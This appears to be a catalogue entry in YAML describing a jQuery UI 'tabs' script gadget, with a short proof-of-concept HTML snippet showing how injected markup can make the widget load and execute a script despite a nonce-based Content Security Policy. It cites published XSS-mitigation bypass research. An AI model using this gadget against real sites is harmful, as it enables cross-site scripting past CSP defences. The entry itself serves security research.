---
description: The official jQuery user interface library.
github: jquery/jquery-ui
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - ul-tag
      - li-tag
      - a-tag
      - id-attr
      - href-attr
      - before-func-call
    pocs:
      - description: The [jQuery UI](https://github.com/jquery/jquery-ui) `tabs` function loads the content of the `href` attribute via an `XMLHttpRequest` and insert it into the DOM using `innerHTML`.
        code: |
          <script nonce="secret" src="https://code.jquery.com/jquery-3.7.1.js"></script>
          <script nonce="secret" src="https://code.jquery.com/ui/1.14.1/jquery-ui.js"></script>
          <script nonce="secret">
            $( function() { $( "#tabs" ).tabs() });
          </script>

          <!-- user input -->
          <div id="tabs"><ul><li><a href="[current-location]/assets/xss/index.js"></a></li></ul></div>
    links:
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/jqueryui.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/jqueryui_exploit.php
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
---
